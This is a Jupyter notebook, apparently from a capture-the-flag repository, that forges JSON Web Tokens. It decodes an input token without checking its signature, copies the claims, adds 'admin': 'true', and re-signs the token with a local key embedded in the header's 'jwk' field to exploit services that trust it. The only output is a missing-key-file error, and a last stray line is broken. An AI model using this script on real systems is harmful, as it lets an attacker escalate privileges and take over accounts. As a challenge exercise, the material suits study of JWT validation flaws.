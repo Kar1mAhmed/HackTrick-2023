{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "ename": "FileNotFoundError",
     "evalue": "[Errno 2] No such file or directory: 'keypair.pem'",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mFileNotFoundError\u001b[0m                         Traceback (most recent call last)",
      "Cell \u001b[1;32mIn[1], line 16\u001b[0m\n\u001b[0;32m     13\u001b[0m     rand1 \u001b[39m=\u001b[39m decoded\u001b[39m.\u001b[39mget(\u001b[39m\"\u001b[39m\u001b[39mrand\u001b[39m\u001b[39m\"\u001b[39m, \u001b[39m\"\u001b[39m\u001b[39m\"\u001b[39m)\n\u001b[0;32m     14\u001b[0m     \u001b[39mreturn\u001b[39;00m iss1, aud1, id1, scope1, name1, email1, rand1\n\u001b[1;32m---> 16\u001b[0m \u001b[39mwith\u001b[39;00m \u001b[39mopen\u001b[39;49m(\u001b[39m\"\u001b[39;49m\u001b[39mkeypair.pem\u001b[39;49m\u001b[39m\"\u001b[39;49m, \u001b[39m\"\u001b[39;49m\u001b[39mrb\u001b[39;49m\u001b[39m\"\u001b[39;49m) \u001b[39mas\u001b[39;00m pemfile:\n\u001b[0;32m     17\u001b[0m     key \u001b[39m=\u001b[39m jwk\u001b[39m.\u001b[39mJWK\u001b[39m.\u001b[39mfrom_pem(pemfile\u001b[39m.\u001b[39mread())\n\u001b[0;32m     18\u001b[0m     public_key \u001b[39m=\u001b[39m key\u001b[39m.\u001b[39mexport(private_key\u001b[39m=\u001b[39m\u001b[39mFalse\u001b[39;00m)\n",
      "File \u001b[1;32m~\\AppData\\Roaming\\Python\\Python310\\site-packages\\IPython\\core\\interactiveshell.py:282\u001b[0m, in \u001b[0;36m_modified_open\u001b[1;34m(file, *args, **kwargs)\u001b[0m\n\u001b[0;32m    275\u001b[0m \u001b[39mif\u001b[39;00m file \u001b[39min\u001b[39;00m {\u001b[39m0\u001b[39m, \u001b[39m1\u001b[39m, \u001b[39m2\u001b[39m}:\n\u001b[0;32m    276\u001b[0m     \u001b[39mraise\u001b[39;00m \u001b[39mValueError\u001b[39;00m(\n\u001b[0;32m    277\u001b[0m         \u001b[39mf\u001b[39m\u001b[39m\"\u001b[39m\u001b[39mIPython won\u001b[39m\u001b[39m'\u001b[39m\u001b[39mt let you open fd=\u001b[39m\u001b[39m{\u001b[39;00mfile\u001b[39m}\u001b[39;00m\u001b[39m by default \u001b[39m\u001b[39m\"\u001b[39m\n\u001b[0;32m    278\u001b[0m         \u001b[39m\"\u001b[39m\u001b[39mas it is likely to crash IPython. If you know what you are doing, \u001b[39m\u001b[39m\"\u001b[39m\n\u001b[0;32m    279\u001b[0m         \u001b[39m\"\u001b[39m\u001b[39myou can use builtins\u001b[39m\u001b[39m'\u001b[39m\u001b[39m open.\u001b[39m\u001b[39m\"\u001b[39m\n\u001b[0;32m    280\u001b[0m     )\n\u001b[1;32m--> 282\u001b[0m \u001b[39mreturn\u001b[39;00m io_open(file, \u001b[39m*\u001b[39margs, \u001b[39m*\u001b[39m\u001b[39m*\u001b[39mkwargs)\n",
      "\u001b[1;31mFileNotFoundError\u001b[0m: [Errno 2] No such file or directory: 'keypair.pem'"
     ]
    }
   ],
   "source": [
    "import jwk, jwt\n",
    "import json\n",
    "\n",
    "def decode_jwt(token1):\n",
    "    \n",
    "    decoded = jwt.decode(token1, options={\"verify_signature\": False, \"verify_aud\": False, \"audience\": \"my_audience\"})\n",
    "    iss1 = decoded.get(\"iss\", \"\")\n",
    "    aud1 = decoded.get(\"aud\", \"\")\n",
    "    id1 = decoded.get(\"id\", \"\")\n",
    "    scope1 = decoded.get(\"scope\", \"\")\n",
    "    name1 = decoded.get(\"name\", \"\")\n",
    "    email1 = decoded.get(\"email\", \"\")\n",
    "    rand1 = decoded.get(\"rand\", \"\")\n",
    "    return iss1, aud1, id1, scope1, name1, email1, rand1\n",
    "    \n",
    "with open(\"keypair.pem\", \"rb\") as pemfile:\n",
    "    key = jwk.JWK.from_pem(pemfile.read())\n",
    "    public_key = key.export(private_key=False)\n",
    "\n",
    "jwks = {\n",
    "    \"e\": key['e'],\n",
    "    \"kid\": key.key_id,\n",
    "    \"kty\": \"RSA\",\n",
    "    \"n\": key['n']\n",
    "}\n",
    "\n",
    "header = {\n",
    "    \"kid\": key.key_id,\n",
    "    \"typ\": \"JWT\",\n",
    "    \"alg\": \"RS256\",\n",
    "    \"jwk\": jwks\n",
    "}\n",
    "        \n",
    "token1 = input(\"Enter JWT token: \")\n",
    "fields = decode_jwt(token1)\n",
    "\n",
    "iss1, aud1, id1, scope1, name1, email1, rand1 = fields\n",
    "\n",
    "claims = {\n",
    "    \"iss\": iss1,\n",
    "    \"aud\": aud1,\n",
    "    \"id\": id1,\n",
    "    \"scope\": scope1,\n",
    "    \"name\": name1,\n",
    "    \"email\": email1,\n",
    "    \"admin\": \"true\",\n",
    "    \"rand\": rand1\n",
    "}\n",
    "\n",
    "Token = jwt.JWT(header=header, claims=claims)\n",
    "Token.make_signed_token(key)\n",
    "print(Token.serialize())\n",
    "\n",
    "key = 'donk'\n",
    "open = '{'\n",
    "close = \"}\"\n",
    "print(f'{open}\\\"{key}\\\"{close}: {value} ')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.0"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
